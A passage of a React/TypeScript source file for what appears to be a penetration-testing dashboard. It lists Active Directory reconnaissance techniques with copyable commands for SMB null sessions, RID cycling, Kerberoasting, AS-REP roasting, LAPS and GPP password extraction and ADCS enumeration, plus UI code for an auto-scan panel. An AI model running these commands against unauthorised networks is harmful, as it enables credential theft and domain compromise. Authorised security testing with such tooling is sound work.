        { label: 'Anonymous group enumeration', cmd: "ldapsearch -x -H ldap://{DC_IP} -b 'DC={Domain},DC=local' '(objectClass=group)' cn", platform: 'linux' },
        { label: 'nmap LDAP rootDSE', cmd: 'nmap -p 389 --script ldap-rootdse,ldap-search {DC_IP}', platform: 'linux' },
        { label: 'Domain info via LDAP', cmd: "ldapsearch -x -H ldap://{DC_IP} -s base -b '' '*'", platform: 'linux' },
      ],
    },
    {
      id: 'recon-smb-null',
      title: 'SMB Null Session',
      mitre: 'T1135', risk: 'HIGH', tool: 'smbclient / enum4linux / nxc', platform: 'linux',
      description: 'Connect to IPC$ with null credentials to enumerate users, shares, and domain info on systems with legacy SMB configurations or explicit null session allowance.',
      commands: [
        { label: 'smbclient null share list', cmd: 'smbclient -N -L //{DC_IP}', platform: 'linux' },
        { label: 'nxc null session', cmd: 'nxc smb {DC_IP} -u "" -p ""', platform: 'linux' },
        { label: 'enum4linux full null enum', cmd: 'enum4linux -a {DC_IP}', platform: 'linux' },
        { label: 'rpcclient null connect', cmd: "rpcclient -U '' -N {DC_IP} -c 'enumdomusers'", platform: 'linux' },
      ],
    },
    {
      id: 'recon-rid-cycling',
      title: 'RID Cycling — Full User Enumeration',
      mitre: 'T1087.002', risk: 'HIGH', tool: 'impacket-lookupsid / nxc', platform: 'linux',
      description: 'Enumerate all domain users and groups by cycling RIDs (500–5000) via SMB. Works with null sessions or low-priv credentials. Produces a full user list for spray campaigns.',
      commands: [
        { label: 'impacket lookupsid (authenticated)', cmd: 'impacket-lookupsid {Domain}/{Username}:{Password}@{DC_IP}', platform: 'linux' },
        { label: 'impacket lookupsid (null session)', cmd: 'impacket-lookupsid {Domain}/anonymous@{DC_IP}', platform: 'linux' },
        { label: 'nxc rid-brute', cmd: 'nxc smb {DC_IP} -u {Username} -p {Password} --rid-brute 5000', platform: 'linux' },
        { label: 'Extract usernames from output', cmd: "impacket-lookupsid {Domain}/{Username}:{Password}@{DC_IP} | grep SidTypeUser | awk -F'\\\\' '{print $2}' | cut -d' ' -f1 > /tmp/users.txt", platform: 'linux' },
      ],
    },
    {
      id: 'recon-dc-fingerprint',
      title: 'DC Fingerprinting',
      mitre: 'T1590.001', risk: 'MEDIUM', tool: 'nmap / ldapsearch / nxc', platform: 'linux',
      description: 'Identify domain controller OS version, forest/domain functional level, and enabled features via LDAP rootDSE, SMB OS detection, and Netlogon probes.',
      commands: [
        { label: 'LDAP rootDSE (forest/domain info)', cmd: "ldapsearch -x -H ldap://{DC_IP} -s base -b '' '*'", platform: 'linux' },
        { label: 'SMB OS detection', cmd: 'nmap -p 445 --script smb-os-discovery {DC_IP}', platform: 'linux' },
        { label: 'nxc DC info', cmd: 'nxc smb {DC_IP} -u {Username} -p {Password} --dc-list', platform: 'linux' },
        { label: 'nmap Netlogon probe', cmd: 'nmap -p 389,636,3268 --script ldap-rootdse {DC_IP}', platform: 'linux' },
      ],
    },
    {
      id: 'recon-kerbrute',
      title: 'Kerbrute User Enumeration',
      mitre: 'T1087.002', risk: 'MEDIUM', tool: 'kerbrute / nmap krb5', platform: 'linux',
      description: 'Enumerate valid domain accounts via Kerberos pre-authentication — no failed login events are generated, producing a confirmed username list for spraying without lockout risk.',
      commands: [
        { label: 'kerbrute user enum', cmd: 'kerbrute userenum -d {Domain} /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc {DC_IP} -t 50 -o /tmp/valid_users.txt', platform: 'linux' },
        { label: 'kerbrute custom list', cmd: 'kerbrute userenum -d {Domain} /tmp/users.txt --dc {DC_IP} -t 20', platform: 'linux' },
        { label: 'nmap krb5-enum-users', cmd: 'nmap -p 88 --script krb5-enum-users --script-args "krb5-enum-users.realm={Domain},userdb=/tmp/users.txt" {DC_IP}', platform: 'linux' },
        { label: 'Extract valid usernames', cmd: "grep 'VALID' /tmp/valid_users.txt | awk '{print $NF}' | cut -d@ -f1 > /tmp/confirmed_users.txt", platform: 'linux' },
      ],
    },
    {
      id: 'recon-bloodhound',
      title: 'BloodHound / ldapdomaindump',
      mitre: 'T1087.002', risk: 'HIGH', tool: 'bloodhound-python / ldapdomaindump', platform: 'linux',
      description: 'Collect and graph AD relationships — group memberships, ACLs, GPOs, sessions, and shortest attack paths to Domain Admin. The most comprehensive authenticated enumeration available.',
      commands: [
        { label: 'bloodhound-python full collection', cmd: 'bloodhound-python -d {Domain} -u {Username} -p {Password} -ns {DC_IP} -c All --zip', platform: 'linux' },
        { label: 'nxc bloodhound collection', cmd: 'nxc ldap {DC_IP} -u {Username} -p {Password} --bloodhound --collection All -ns {DC_IP}', platform: 'linux' },
        { label: 'ldapdomaindump full dump', cmd: "ldapdomaindump -u '{Domain}\\{Username}' -p '{Password}' {DC_IP} -o /tmp/ldapdump/", platform: 'linux' },
        { label: 'bloodhound stealth (DCOnly)', cmd: 'bloodhound-python -d {Domain} -u {Username} -p {Password} -ns {DC_IP} -c DCOnly --zip', platform: 'linux' },
      ],
    },
    {
      id: 'recon-trust-enum',
      title: 'Forest / Domain Trust Enumeration',
      mitre: 'T1482', risk: 'MEDIUM', tool: 'ldapsearch / nltest / PowerView', platform: 'both',
      description: 'Enumerate inter-domain and forest trusts — trusted domains may be reachable via cross-domain privilege escalation or Kerberos trust abuse to expand scope.',
      commands: [
        { label: 'ldapsearch trust query', cmd: "ldapsearch -x -H ldap://{DC_IP} -D '{Domain}\\{Username}' -w '{Password}' -b 'CN=System,DC={Domain},DC=local' '(objectClass=trustedDomain)' name trustDirection", platform: 'linux' },
        { label: 'nxc trusted for delegation', cmd: 'nxc smb {DC_IP} -u {Username} -p {Password} --trusted-for-delegation', platform: 'linux' },
        { label: 'nltest domain trusts', cmd: 'nltest /domain_trusts /all_trusts', platform: 'windows' },
        { label: 'PowerView trust enum', cmd: 'Get-DomainTrust | Select SourceName,TargetName,TrustDirection,TrustType | Format-Table', platform: 'windows' },
      ],
    },
    {
      id: 'recon-spn-discovery',
      title: 'SPN Discovery — Kerberoastable',
      mitre: 'T1558.003', risk: 'HIGH', tool: 'impacket-GetUserSPNs / nxc', platform: 'both',
      description: 'Enumerate all accounts with registered Service Principal Names — these accounts can have TGS tickets extracted and cracked offline (Kerberoasting) with any domain credentials.',
      commands: [
        { label: 'GetUserSPNs hash extraction', cmd: 'impacket-GetUserSPNs {Domain}/{Username}:{Password} -dc-ip {DC_IP} -outputfile /tmp/spns.hash', platform: 'linux' },
        { label: 'nxc kerberoast', cmd: 'nxc ldap {DC_IP} -u {Username} -p {Password} --kerberoasting /tmp/kerb_hashes.txt', platform: 'linux' },
        { label: 'GetUserSPNs list only', cmd: 'impacket-GetUserSPNs {Domain}/{Username}:{Password} -dc-ip {DC_IP} -no-preauth', platform: 'linux' },
        { label: 'PowerView SPN users', cmd: 'Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName | Select SamAccountName,ServicePrincipalName | Format-Table', platform: 'windows' },
      ],
    },
    {
      id: 'recon-asrep-roast',
      title: 'AS-REP Roastable Users',
      mitre: 'T1558.004', risk: 'HIGH', tool: 'impacket-GetNPUsers / nxc', platform: 'both',
      description: 'Find accounts with "Do not require Kerberos preauthentication" set — AS-REP hashes can be captured without credentials and cracked offline to recover plaintext passwords.',
      commands: [
        { label: 'GetNPUsers — no creds needed', cmd: 'impacket-GetNPUsers {Domain}/ -dc-ip {DC_IP} -no-pass -usersfile /tmp/users.txt -format hashcat -outputfile /tmp/asrep.hash', platform: 'linux' },
        { label: 'nxc AS-REP roast', cmd: 'nxc ldap {DC_IP} -u {Username} -p {Password} --asreproast /tmp/asrep_hashes.txt', platform: 'linux' },
        { label: 'GetNPUsers (authenticated)', cmd: 'impacket-GetNPUsers {Domain}/{Username}:{Password} -dc-ip {DC_IP} -format hashcat -outputfile /tmp/asrep.hash', platform: 'linux' },
        { label: 'PowerView no-preauth accounts', cmd: 'Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth | Select SamAccountName', platform: 'windows' },
      ],
    },
    {
      id: 'recon-gpo-enum',
      title: 'GPO Enumeration',
      mitre: 'T1615', risk: 'MEDIUM', tool: 'nxc / ldapsearch / PowerView', platform: 'both',
      description: 'List all Group Policy Objects and their linked OUs — GPOs may contain startup scripts, mapped drives, or software deployments useful for lateral movement and privilege escalation.',
      commands: [
        { label: 'nxc GPO list', cmd: 'nxc smb {DC_IP} -u {Username} -p {Password} --gpo-list', platform: 'linux' },
        { label: 'ldapsearch GPO containers', cmd: "ldapsearch -x -H ldap://{DC_IP} -D '{Domain}\\{Username}' -w '{Password}' -b 'CN=Policies,CN=System,DC={Domain},DC=local' '(objectClass=groupPolicyContainer)' displayName gPCFileSysPath", platform: 'linux' },
        { label: 'SYSVOL GPO scripts', cmd: "smbclient //{DC_IP}/SYSVOL -U '{Domain}/{Username}%{Password}' -c 'recurse ON; ls' | grep -E '\\.bat|\\.ps1|\\.vbs|\\.cmd'", platform: 'linux' },
        { label: 'PowerView GPO enum', cmd: 'Get-GPO -All | Select DisplayName,Id,GpoStatus | Format-Table -AutoSize', platform: 'windows' },
      ],
    },
    {
      id: 'recon-laps',
      title: 'LAPS Discovery',
      mitre: 'T1012', risk: 'MEDIUM', tool: 'nxc / ldapsearch / lapsdumper', platform: 'both',
      description: 'Check if LAPS is deployed and whether the current user can read ms-Mcs-AdmPwd attributes — readable LAPS gives direct local admin access on any in-scope machine.',
      commands: [
        { label: 'nxc LAPS check', cmd: 'nxc ldap {DC_IP} -u {Username} -p {Password} -M laps', platform: 'linux' },
        { label: 'ldapsearch LAPS passwords', cmd: "ldapsearch -x -H ldap://{DC_IP} -D '{Domain}\\{Username}' -w '{Password}' -b 'DC={Domain},DC=local' '(ms-Mcs-AdmPwd=*)' ms-Mcs-AdmPwd sAMAccountName", platform: 'linux' },
        { label: 'lapsdumper extract', cmd: 'python3 lapsdumper.py -u {Username} -p {Password} -d {Domain} -l {DC_IP}', platform: 'linux' },
        { label: 'PowerView LAPS readable', cmd: 'Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd | Where {$_."ms-Mcs-AdmPwd" -ne $null} | Select Name,"ms-Mcs-AdmPwd"', platform: 'windows' },
      ],
    },
    {
      id: 'recon-adcs-enum',
      title: 'ADCS / PKI Template Enumeration',
      mitre: 'T1649', risk: 'HIGH', tool: 'certipy / nxc', platform: 'both',
      description: 'Enumerate ADCS certificate templates for ESC1–ESC8 misconfigurations — vulnerable templates allow any domain user to escalate to Domain Admin via certificate-based authentication.',
      commands: [
        { label: 'certipy find vulnerable', cmd: 'certipy find -u {Username}@{Domain} -p {Password} -dc-ip {DC_IP} -vulnerable -stdout', platform: 'linux' },
        { label: 'certipy full CA enum', cmd: 'certipy find -u {Username}@{Domain} -p {Password} -dc-ip {DC_IP} -output /tmp/certipy_{Domain}', platform: 'linux' },
        { label: 'nxc ADCS CA discovery', cmd: 'nxc ldap {DC_IP} -u {Username} -p {Password} -M adcs', platform: 'linux' },
        { label: 'ldapsearch PKI templates', cmd: "ldapsearch -x -H ldap://{DC_IP} -D '{Domain}\\{Username}' -w '{Password}' -b 'CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC={Domain},DC=local' '(objectClass=pKICertificateTemplate)' cn msPKI-Certificate-Name-Flag", platform: 'linux' },
      ],
    },
    {
      id: 'recon-acl-dacl',
      title: 'ACL / DACL Mapping',
      mitre: 'T1069', risk: 'MEDIUM', tool: 'bloodhound-python / dacledit / nxc', platform: 'both',
      description: 'Map misconfigured ACLs on AD objects — WriteDACL, GenericAll, WriteOwner on Domain Admins group or AdminSDHolder are direct privilege escalation paths.',
      commands: [
        { label: 'bloodhound ACL collection', cmd: 'bloodhound-python -d {Domain} -u {Username} -p {Password} -ns {DC_IP} -c ACL --zip', platform: 'linux' },
        { label: 'dacledit read target ACLs', cmd: 'python3 dacledit.py -action read -d {Domain} -u {Username} -p {Password} -dc-ip {DC_IP} -principal {TargetUser}', platform: 'linux' },
        { label: 'nxc DACL read', cmd: 'nxc ldap {DC_IP} -u {Username} -p {Password} -M daclread --options TARGET:{TargetUser}', platform: 'linux' },
        { label: 'PowerView GenericAll hunt', cmd: 'Get-ObjectAcl -ResolveGUIDs | Where {($_.ActiveDirectoryRights -match "GenericAll|WriteDACL|WriteOwner") -and ($_.SecurityIdentifier -notmatch "S-1-5-18|S-1-5-32|S-1-3")} | Select ObjectDN,SecurityIdentifier,ActiveDirectoryRights', platform: 'windows' },
      ],
    },
    {
      id: 'recon-sysvol-netlogon',
      title: 'SYSVOL / NETLOGON Share Recon',
      mitre: 'T1135', risk: 'HIGH', tool: 'smbclient / Get-GPPPassword', platform: 'both',
      description: 'Enumerate SYSVOL and NETLOGON for Group Policy Preferences XML files containing cpassword (AES-32 key is published by Microsoft), startup scripts, and mapped drive credentials.',
      commands: [
        { label: 'smbclient SYSVOL recurse', cmd: "smbclient //{DC_IP}/SYSVOL -U '{Domain}/{Username}%{Password}' -c 'recurse ON; ls'", platform: 'linux' },
        { label: 'Find GPP cpassword files', cmd: "find /tmp/sysvol -name 'Groups.xml' -o -name 'Services.xml' -o -name 'Scheduledtasks.xml' | xargs grep -l 'cpassword' 2>/dev/null", platform: 'linux' },
        { label: 'Get-GPPPassword extract', cmd: 'python3 Get-GPPPassword.py {Domain}/{Username}:{Password}@{DC_IP}', platform: 'linux' },
        { label: 'PowerView GPP passwords', cmd: 'Get-GPPPassword | Select UserName,Password,Changed,File | Format-Table -AutoSize', platform: 'windows' },
      ],
    },
  ],
}

const RISK_COLORS: Record<string, string> = {
  CRITICAL: '#ff4d6d', HIGH: '#ffa94d', MEDIUM: '#ffd166', LOW: '#51cf66',
}

const PLATFORM_COLORS = { linux: '#34d399', windows: '#60a5fa', both: '#a78bfa' }

function hexToRgb(h: string) {
  const r = /^#?([a-f\d]{2})([a-f\d]{2})([a-f\d]{2})$/i.exec(h)
  return r ? `${parseInt(r[1], 16)},${parseInt(r[2], 16)},${parseInt(r[3], 16)}` : '167,139,250'
}

function CopyBtn({ text }: { text: string }) {
  const [done, setDone] = useState(false)
  return (
    <button
      onClick={() => { copyText(text); setDone(true); setTimeout(() => setDone(false), 1500) }}
      className="flex items-center gap-1 rounded border px-2 py-0.5 text-[9px] transition-all"
      style={done
        ? { color: '#34d399', borderColor: '#34d39940', background: '#34d3990d' }
        : { color: '#52525b', borderColor: 'rgba(255,255,255,0.08)' }}
    >
      {done ? <Check className="h-2.5 w-2.5" /> : <Copy className="h-2.5 w-2.5" />}
      {done ? 'copied' : 'copy'}
    </button>
  )
}

function SeverityPill({ sev }: { sev: string }) {
  const color = SEVERITY_COLORS[sev] || '#888'
  return (
    <span
      className="px-1.5 py-0.5 rounded text-[10px] font-bold uppercase tracking-wider"
      style={{ background: `${color}22`, color, border: `1px solid ${color}44` }}
    >
      {sev}
    </span>
  )
}

function FindingRow({ f }: { f: ScanFinding }) {
  return (
    <div className="p-3 rounded-lg border" style={{ background: 'rgba(255,255,255,0.02)', borderColor: 'rgba(255,255,255,0.06)' }}>
      <div className="flex items-center gap-2 mb-1">
        <SeverityPill sev={f.severity} />
        {f.mitre_id && (
          <span className="text-[10px] px-1.5 py-0.5 rounded" style={{ ...MONO, background: 'rgba(124,58,237,0.15)', color: '#a78bfa', border: '1px solid #7c3aed44' }}>
            {f.mitre_id}
          </span>
        )}
        <span className="text-sm font-medium text-slate-200 flex-1">{f.title}</span>
      </div>
      <p className="text-xs text-slate-400 pl-1" style={MONO}>{f.detail}</p>
    </div>
  )
}

function TechCard({ tech, accentRgb, platformFilter }: {
  tech: ReconTech
  accentRgb: string
  platformFilter: 'linux' | 'windows' | 'all'
}) {
  const [open, setOpen] = useState(false)
  const rColor = RISK_COLORS[tech.risk]
  const pColor = PLATFORM_COLORS[tech.platform]

  const cmds = platformFilter === 'all'
    ? tech.commands
    : tech.commands.filter(c => !c.platform || c.platform === platformFilter)

  return (
    <div
      className="rounded-xl border transition-all duration-150"
      style={{
        borderColor: open ? `rgba(${accentRgb},0.3)` : 'rgba(255,255,255,0.05)',
        background: open ? `rgba(${accentRgb},0.05)` : 'rgba(255,255,255,0.01)',
      }}
    >
      <button className="flex w-full items-center gap-3 px-4 py-3 text-left" onClick={() => setOpen(v => !v)}>
        <ChevronRight
          className={cn('h-3.5 w-3.5 text-zinc-600 flex-shrink-0 transition-transform', open && 'rotate-90')}
          style={open ? { color: `rgba(${accentRgb},1)` } : {}}
        />
        <div className="flex-1 min-w-0">
          <div className="flex items-center gap-2 flex-wrap">
            <span className="text-sm font-semibold text-zinc-100">{tech.title}</span>
            <span className="rounded border px-1.5 py-0.5 text-[9px] font-bold uppercase" style={{ color: rColor, borderColor: `${rColor}30`, background: `${rColor}10` }}>
              {tech.risk}
            </span>
            <span className="rounded border px-1.5 py-0.5 text-[9px] font-bold uppercase" style={{ color: pColor, borderColor: `${pColor}30`, background: `${pColor}10` }}>
              {tech.platform}
            </span>
          </div>
          <div className="flex items-center gap-2 mt-0.5">
            <span className="text-[10px] text-zinc-600 truncate" style={MONO}>{tech.tool}</span>
            <span className="text-zinc-800">·</span>
            <span className="text-[10px] text-zinc-600" style={MONO}>{tech.mitre}</span>
          </div>
        </div>
      </button>

      <AnimatePresence initial={false}>
        {open && (
          <motion.div
            key="body"
            initial={{ opacity: 0, height: 0 }}
            animate={{ opacity: 1, height: 'auto' }}
            exit={{ opacity: 0, height: 0 }}
            transition={{ duration: 0.16 }}
            className="overflow-hidden"
          >
            <div className="border-t border-white/5 px-4 pb-4 pt-3 space-y-2">
              <p className="text-[11px] text-zinc-400 leading-relaxed mb-3">{tech.description}</p>
              {cmds.length === 0 && (
                <p className="text-center text-[10px] text-zinc-600 py-3">No commands for selected platform</p>
              )}
              {cmds.map(c => (
                <div key={c.label} className="rounded-xl border border-white/5 bg-black/45 p-3">
                  <div className="flex justify-between items-center mb-2">
                    <span className="text-[10px] font-semibold text-zinc-300" style={MONO}>{c.label}</span>
                    <CopyBtn text={c.cmd} />
                  </div>
                  <pre className="text-[10px] text-emerald-400 whitespace-pre-wrap break-all" style={MONO}>{c.cmd}</pre>
                </div>
              ))}
            </div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  )
}

export function ReconHub() {
  const [activeTab, setActiveTab] = useState<TabKey>('osint')
  const [search, setSearch] = useState('')
  const [platform, setPlatform] = useState<'linux' | 'windows' | 'all'>('all')
  const [dcIp, setDcIp] = useState('')
  const [domain, setDomain] = useState('')
  const [currentScanId, setCurrentScanId] = useState<string | null>(null)
  const [scanError, setScanError] = useState<string | null>(null)
  const qc = useQueryClient()

  const tab = TABS.find(t => t.key === activeTab)!
  const tabRgb = hexToRgb(tab.color)

  const { data: scanData } = useQuery({
    queryKey: ['recon-scan', currentScanId],
    queryFn: () => reconApi.getScan(currentScanId!),
    enabled: !!currentScanId,
    refetchInterval: q => {
      const d = q.state.data
      return d?.status === 'queued' || d?.status === 'running' ? 2000 : false
    },
  })

  const startMutation = useMutation({
    mutationFn: () => reconApi.startScan({ target_dc_ip: dcIp, domain }),
    onSuccess: d => {
      setScanError(null)
      setCurrentScanId(d.scan_id)
      qc.invalidateQueries({ queryKey: ['recon-scans'] })
    },
    onError: (err: unknown) => {
      const msg = (err as { response?: { data?: { detail?: string } }; message?: string })
        ?.response?.data?.detail ?? (err as { message?: string })?.message ?? 'Scan failed'
      setScanError(msg)
    },
  })

  const scanRunning = scanData?.status === 'queued' || scanData?.status === 'running'

  const techniques = TECHNIQUES[activeTab]
  const visible = techniques.filter(t =>
    !search ||
    t.title.toLowerCase().includes(search.toLowerCase()) ||
    t.mitre.includes(search.toUpperCase()) ||
    t.tool.toLowerCase().includes(search.toLowerCase())
  )

  const totalCount = Object.values(TECHNIQUES).flat().length

  return (
    <div className="h-full flex flex-col gap-4 p-4">
      <BackButton />

      {/* Header */}
      <div className="flex items-center justify-between">
        <div className="flex items-center gap-3">
          <div
            className="p-2 rounded-lg"
            style={{ background: `rgba(${tabRgb},0.15)`, border: `1px solid rgba(${tabRgb},0.3)` }}
          >
            <Radar className="h-5 w-5" style={{ color: tab.color }} />
          </div>
          <div>
            <h1 className="text-lg font-bold text-slate-100" style={MONO}>RECONNAISSANCE & OSINT</h1>
            <p className="text-xs text-slate-400">
              Phase 0 · {totalCount} techniques · MITRE T1046–T1596
            </p>
          </div>
        </div>
        {scanData?.summary && (
          <div
            className="flex items-center gap-2 px-3 py-1.5 rounded-lg text-sm"
            style={{ background: 'rgba(57,217,138,0.1)', border: '1px solid rgba(57,217,138,0.3)', color: '#39d98a', ...MONO }}
          >
            <CheckCircle2 className="h-4 w-4" />
            {scanData.summary.total} findings
          </div>
        )}
      </div>

      {/* Tab pills */}
      <div className="flex items-center gap-2 flex-wrap">
        {TABS.map(({ key, label, icon: Icon, color }) => {
          const rgb = hexToRgb(color)
          const isActive = activeTab === key
          return (
            <button
              key={key}
              onClick={() => { setActiveTab(key); setSearch('') }}
              className="flex items-center gap-1.5 rounded-xl border px-4 py-2 text-sm font-semibold transition-all"
              style={isActive
                ? { background: `rgba(${rgb},0.18)`, borderColor: `rgba(${rgb},0.4)`, color }
                : { background: 'rgba(255,255,255,0.02)', borderColor: 'rgba(255,255,255,0.08)', color: '#52525b' }
              }
            >
              <Icon className="h-3.5 w-3.5" />
              {label}
              <span className="text-[10px] ml-0.5 opacity-60" style={MONO}>
                {TECHNIQUES[key].length}
              </span>
            </button>
          )
        })}
      </div>

      {/* Main grid */}
      <div className="flex-1 grid grid-cols-5 gap-4 min-h-0">

        {/* Technique column */}
        <div className="col-span-3 flex flex-col gap-2.5 min-h-0">
          {/* Search + platform filter */}
          <div className="flex items-center gap-2">
            <div className="relative flex-1">
              <Search className="absolute left-2.5 top-1/2 -translate-y-1/2 h-3.5 w-3.5 text-slate-500" />
              <input
                value={search}
                onChange={e => setSearch(e.target.value)}
                placeholder={`Search ${tab.label}…`}
                className="w-full pl-8 pr-3 py-2 rounded-lg text-sm bg-transparent border text-slate-300 outline-none focus:border-purple-500/50 transition-colors"
                style={{ ...MONO, borderColor: 'rgba(255,255,255,0.08)' }}
              />
            </div>
            {/* Platform filter pills */}
            {(['all', 'linux', 'windows'] as const).map(p => (
              <button
                key={p}
                onClick={() => setPlatform(p)}
                className={cn('rounded-lg border px-3 py-1.5 text-[11px] font-semibold transition-all capitalize flex-shrink-0',
                  platform === p ? 'border-transparent text-black' : 'border-white/10 text-zinc-500 hover:text-zinc-300 bg-white/[0.02]'
                )}
                style={platform === p ? { background: p === 'linux' ? '#34d399' : p === 'windows' ? '#60a5fa' : '#6366f1' } : {}}
              >
                {p === 'all' ? 'All' : p === 'linux' ? '🐧' : '🪟'}
              </button>
            ))}
          </div>

          <div className="text-[10px] text-zinc-700 px-1" style={MONO}>
            {visible.length} technique{visible.length !== 1 ? 's' : ''} · {tab.label}
          </div>

          <div className="flex-1 overflow-y-auto space-y-2 pr-1">
            {visible.map(t => (
              <TechCard key={t.id} tech={t} accentRgb={tabRgb} platformFilter={platform} />
            ))}
          </div>
        </div>

        {/* Right panel — auto-scan */}
        <div className="col-span-2 flex flex-col gap-3 min-h-0">
          <div
            className="p-4 rounded-xl border"
            style={{ background: 'rgba(255,255,255,0.02)', borderColor: 'rgba(255,255,255,0.07)' }}
          >
            <div className="flex items-center gap-2 mb-3">
              <Zap className="h-4 w-4" style={{ color: '#ffd166' }} />
              <span className="text-sm font-semibold text-slate-200" style={MONO}>Auto-Scan (11 probes)</span>
            </div>
            <div className="space-y-2 mb-3">
              {([['DC IP', dcIp, setDcIp, '10.0.0.1'], ['Domain', domain, setDomain, 'corp.local']] as [string, string, (v: string) => void, string][]).map(([label, val, setter, ph]) => (
                <div key={label}>
                  <label className="block text-[10px] text-slate-500 mb-1" style={MONO}>{label}</label>
                  <input
                    value={val}
                    onChange={e => setter(e.target.value)}
                    placeholder={ph}
                    className="w-full px-3 py-2 rounded-lg text-sm bg-transparent border text-slate-300 outline-none focus:border-purple-500"
                    style={{ ...MONO, borderColor: 'rgba(255,255,255,0.1)' }}
                  />
                </div>
              ))}
            </div>
            {scanError && (
              <div className="mb-2 px-3 py-2 rounded-lg text-xs" style={{ background: 'rgba(255,77,109,0.1)', border: '1px solid rgba(255,77,109,0.3)', color: '#ff4d6d', ...MONO }}>
                {scanError}
              </div>
            )}
            <button
              onClick={() => { setScanError(null); startMutation.mutate() }}
              disabled={!dcIp || !domain || startMutation.isPending || scanRunning}
              className="flex items-center justify-center gap-2 px-4 py-2 rounded-lg text-sm font-semibold transition-all disabled:opacity-40 w-full"
              style={{ background: startMutation.isPending ? 'rgba(124,58,237,0.5)' : 'rgba(124,58,237,0.8)', color: '#fff', ...MONO }}
            >
              <Play className="h-4 w-4" />
              {startMutation.isPending ? 'Starting…' : scanRunning ? 'Scanning…' : 'Run Phase 0 Scan'}
            </button>
          </div>

          {currentScanId && (
            <div className="rounded-xl border overflow-hidden" style={{ borderColor: 'rgba(255,255,255,0.07)' }}>
              <div
                className="px-3 py-1.5 border-b flex items-center justify-between"
                style={{ borderColor: 'rgba(255,255,255,0.06)', background: 'rgba(0,0,0,0.3)' }}
              >
                <span className="text-[10px] text-slate-400" style={MONO}>scan · {currentScanId.slice(0, 8)}</span>
                {scanData && <SeverityPill sev={scanData.status === 'completed' ? 'LOW' : 'HIGH'} />}
              </div>
              <div className="h-44"><LiveOutputTerminal jobId={currentScanId} wsPath="/recon/ws/scan" outputPath="/recon/scan" /></div>
            </div>
          )}

          {scanData && scanData.findings.length > 0 && (
            <div className="space-y-2 flex-1 overflow-y-auto">
              <p className="text-[10px] text-slate-500 uppercase tracking-widest font-bold px-1" style={MONO}>
                Findings ({scanData.findings.length})
              </p>
              {scanData.findings.map((f, i) => <FindingRow key={i} f={f} />)}
            </div>
          )}
        </div>
      </div>
    </div>
  )
}


